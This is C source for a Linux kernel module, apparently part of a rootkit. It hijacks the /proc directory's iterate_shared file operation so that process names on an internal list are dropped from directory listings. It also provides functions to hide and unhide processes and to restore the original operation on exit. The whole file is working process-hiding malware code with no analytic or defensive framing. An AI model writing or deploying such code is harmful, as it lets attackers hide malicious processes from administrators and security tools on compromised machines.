#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/slab.h>
#include <linux/list.h>

#include "hide_proc.h"

static struct path p;
static struct inode *p_inode;
static const struct file_operations *p_old_fop;
static struct file_operations p_new_fop;
static struct dir_context *old_ctx;

struct hidden_proc {
	char *name;
	struct list_head list;
};

static LIST_HEAD(hidden_proc_list);

static int hide_proc_filldir_t(struct dir_context *ctx, const char *proc_name,
			       int d_reclen, loff_t d_off, u64 d_ino,
			       unsigned d_type)
{
	if (is_proc_hidden(proc_name)) {
		return 0;
	}

	return old_ctx->actor(old_ctx, proc_name, d_reclen, d_off, d_ino,
			      d_type);
}

struct dir_context hide_proc_ctx = { .actor = hide_proc_filldir_t };

int hide_proc_iterate_shared(struct file *file, struct dir_context *ctx)
{
	int ret;

	hide_proc_ctx.pos = ctx->pos;
	old_ctx = ctx;

	ret = p_old_fop->iterate_shared(file, &hide_proc_ctx);

	ctx->pos = hide_proc_ctx.pos;
	return ret;
}

int hide_proc_init(void)
{
	if (kern_path("/proc", 0, &p)) {
		return -ENOENT;
	}

	/* backup fop for proc fs */
	p_inode = p.dentry->d_inode;
	p_new_fop = *p_inode->i_fop;
	p_old_fop = p_inode->i_fop;

	/* replace existing iterate_shared with our own one */
	p_new_fop.iterate_shared = hide_proc_iterate_shared;
	p_inode->i_fop = &p_new_fop;

	return 0;
}

int hide_proc_exit(void)
{
	struct list_head *l;
	struct list_head *n;
	struct hidden_proc *proc;

	if (kern_path("/proc", 0, &p)) {
		return -ENOENT;
	}

	p_inode = p.dentry->d_inode;
	p_inode->i_fop = p_old_fop;

	list_for_each_safe (l, n, &hidden_proc_list) {
		proc = list_entry(l, struct hidden_proc, list);
		list_del(&proc->list);
		kfree(proc->name);
		kfree(proc);
	}

	return 0;
}

int hide_proc(const char *proc_name)
{
	int ret = 0;
	struct hidden_proc *p = kmalloc(sizeof(struct hidden_proc), GFP_KERNEL);

	if (!p) {
		ret = -ENOMEM;
		goto err;
	}

	if (is_proc_hidden(proc_name)) {
		ret = -EINVAL;
		goto err_free_p;
	}

	p->name = kstrdup(proc_name, GFP_KERNEL);
	if (!p->name) {
		ret = -ENOMEM;
		goto err_free_p;
	}

	list_add(&p->list, &hidden_proc_list);

	return ret;

err_free_p:
	kfree(p);
err:
	return ret;
}

int unhide_proc(const char *proc_name)
{
	struct list_head *l;
	struct list_head *n;
	struct hidden_proc *proc;

	list_for_each_safe (l, n, &hidden_proc_list) {
		proc = list_entry(l, struct hidden_proc, list);
		if (strncmp(proc_name, proc->name, strlen(proc->name)) == 0) {
			list_del(&proc->list);
			kfree(proc->name);
			kfree(proc);
			return 0;
		}
	}

	return -EINVAL;
}

bool is_proc_hidden(const char *proc_name)
{
	struct hidden_proc *p = NULL;
	list_for_each_entry (p, &hidden_proc_list, list) {
		if (strncmp(proc_name, p->name, strlen(p->name)) == 0) {
			return true;
		}
	}
	return false;
}
